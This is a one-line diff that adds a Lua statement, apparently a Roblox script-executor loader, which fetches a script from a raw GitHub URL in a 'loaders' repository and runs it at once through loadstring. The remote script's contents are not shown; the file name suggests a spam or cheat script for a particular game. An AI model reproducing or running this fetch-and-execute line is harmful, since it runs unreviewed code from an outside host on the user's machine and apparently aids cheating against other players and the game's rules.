@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/interrogation-new-cases-spam2-ezhxbhwno1t8ja.lua"))()
